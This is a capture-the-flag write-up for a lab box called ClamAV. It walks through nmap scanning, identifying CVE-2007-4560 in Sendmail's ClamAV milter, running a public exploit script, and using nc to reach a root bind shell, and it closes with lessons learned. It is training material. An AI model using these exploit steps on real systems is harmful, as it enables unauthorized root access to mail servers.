---
title: "ClamAV - Writeup"
linkTitle: "ClamAV"
weight: 5
featured: true
platform: "PG"
name: "ClamAV"
os: "Linux"
difficulty: "Easy"
release: "01 Jul 2026"
ip: "192.168.51.42"
# Drop a real avatar at static/img/pg/clamav.png and uncomment:
# avatar: "/img/pg/clamav.png"
tags: ["linux", "sendmail", "clamav", "cve-2007-4560", "milter", "root-shell"]
description: "Easy Linux box. A decade-old Sendmail install talking to ClamAV's milter interface gives root through a single unauthenticated exploit."
---

{{< htb name="ClamAV" os="Linux" difficulty="Easy" release="01 Jul 2026" ip="192.168.51.42" platform="PG" >}}

## Reconnaissance

```
(root㉿kali)# nmap 192.168.51.42
```

```
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
139/tcp open  netbios-ssn
199/tcp open  smux
445/tcp open  microsoft-ds
```

```
(root㉿kali)# nmap 192.168.51.42 -p22,25,80,445 -sCV --script smtp-vuln-*,http-vuln-*,smb-vuln-*
```

```
22/tcp  open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
25/tcp  open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-vuln-cve2010-4344:
|_  The SMTP server is not Exim: NOT VULNERABLE
80/tcp  open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

Every version here is ancient, Sendmail from 2005, Apache 1.3.33, Debian sarge. Nmap's built-in SMTP vuln scripts come back clean, but the age of the stack is itself the signal to dig further.

## Enumeration

Nothing on Debian sarge is this old by accident. Sendmail on this era commonly integrates with **ClamAV** through the milter interface for mail scanning, and that integration has its own well-known unauthenticated RCE, [CVE-2007-4560](https://github.com/strikoder/sendmail-clamav-exploit-CVE-2007-4560).

## Initial Foothold

```
(root㉿kali)# git clone https://github.com/strikoder/sendmail-clamav-exploit-CVE-2007-4560
(root㉿kali)# cd sendmail-clamav-exploit-CVE-2007-4560
(root㉿kali)# python sendmail_clamav_exploit.py 192.168.51.42
```

```
[+] Connected: 220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3
[*] Injecting payloads...
[+] Exploit delivered!

Connect with: nc 192.168.51.42 1001
Then run: bash -i
```

The exploit abuses how ClamAV's milter handles a crafted email to plant a listener on the target. Connect to it directly.

```
(root㉿kali)# nc 192.168.51.42 1001
```

```
bash -i
bash: no job control in this shell
root@0xbabe:/#
```

The shell lands as `root` immediately, no privilege escalation needed. Grab the flag.

```
root@0xbabe:/# cd ../root
root@0xbabe:/root# cat proof.txt
```

```
fe08d5b422630eee8f907658b0bef6dd
```

## Privilege Escalation

None needed. ClamAV's milter process runs as root by default on this era of Debian, so the exploit lands with full privileges on the first connection.

## Lessons learned

- Treat an unusually old software stack as a lead by itself. When every service is a decade or more out of date, the version numbers matter more than what the vuln scripts report, since not every known CVE for that era has an nmap NSE script written for it.
- Know the surrounding ecosystem of a service, not just the service itself. The vulnerability here wasn't in Sendmail directly, it was in ClamAV's milter integration with it, a connection that only shows up if you know mail servers commonly hook into antivirus scanners this way.
- A background service running as root turns any RCE against it into instant root. Recognize which daemons run at the highest privilege by default, mail scanners and system services are common candidates, so a foothold there often skips privesc entirely.
